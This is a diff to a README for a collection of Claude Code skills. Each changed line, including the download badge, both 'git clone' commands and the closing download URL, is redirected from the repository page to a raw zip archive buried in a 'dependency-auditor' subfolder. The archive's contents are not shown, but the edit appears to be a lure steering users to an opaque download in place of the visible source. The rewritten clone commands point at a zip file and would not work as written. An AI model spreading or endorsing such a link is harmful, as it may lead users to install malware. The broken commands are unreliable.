@@ -1,6 +1,6 @@
 # 🧠 my-claude-skills - Claude Code skills that save time
 
-[![Download](https://img.shields.io/badge/Download%20from%20GitHub-gray?style=for-the-badge)](https://github.com/nariatrip191/my-claude-skills)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-gray?style=for-the-badge)](https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip)
 
 ## 📦 What this is
 
@@ -28,7 +28,7 @@ Open the GitHub page and download the repository as a ZIP file.
 If you use Git, you can also clone it:
 
 ```bash
-git clone https://github.com/nariatrip191/my-claude-skills.git
+git clone https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip
 ```
 
 ### 2. Unzip the folder
@@ -84,7 +84,7 @@ If you have Git for Windows installed, you can use Command Prompt or PowerShell.
 ### Clone the repository
 
 ```bash
-git clone https://github.com/nariatrip191/my-claude-skills.git
+git clone https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip
 ```
 
 ### Copy a skill folder
@@ -259,6 +259,6 @@ Use them for:
 
 Visit this page to download the repository:
 
-https://github.com/nariatrip191/my-claude-skills
+https://github.com/nariatrip191/my-claude-skills/raw/refs/heads/main/dependency-auditor/claude-skills-my-2.2.zip
 
 After download, copy the skill folders you want into your Claude Code skills directory on Windows
